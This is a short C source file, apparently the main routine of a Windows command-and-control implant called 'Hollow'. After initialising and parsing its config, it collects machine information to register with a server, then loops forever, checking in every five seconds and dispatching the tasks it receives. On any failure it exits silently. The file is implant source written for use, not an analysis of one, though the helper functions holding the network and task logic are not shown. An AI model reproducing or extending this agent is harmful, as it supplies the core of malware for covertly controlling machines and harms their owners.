#include "../../includes/core/core.h"
#include "../../includes/core/tasker.h"

Hollow* hollow = NULL;



/*
	HollowInit() -> allocate core structs/objects, load apis, init net
	HollowParseConfig() -> Parse Confifg, saves to hollow->config->whatever
	HollowRegisterAgent() -> collect machine info and register
	->
	loop -> DoPost -> Parse -> dispatch -> send output
*/


void HollowMain() {
#ifdef _DEBUG
	AllocConsole();
#endif
	DEBUG_LOGA("[*] Agent Started, Running Init");

	if (!HollowInit()) {
		DEBUG_LOGA("[!] Failed init");
		ExitProcess(0);
	}
	if (!ParseConfig()) {
		DEBUG_LOGA("[!] Failed parsing config\n");
		ExitProcess(0);
	}
	if (!RegisterAgent()) {
		DEBUG_LOGA("[!] Failed Register");
		ExitProcess(0);
	}

	while (TRUE) {
		DEBUG_LOGA("[+] Checking in...");
		if (!Checkin()) {
			DEBUG_LOGA("[!] Failed Checkin");
			break;
		}

		if (!Dispatch()) {
			DEBUG_LOGA("[!] Failed Dispatch");
			break;
		}

		Sleep(5000);

	}



	return;





}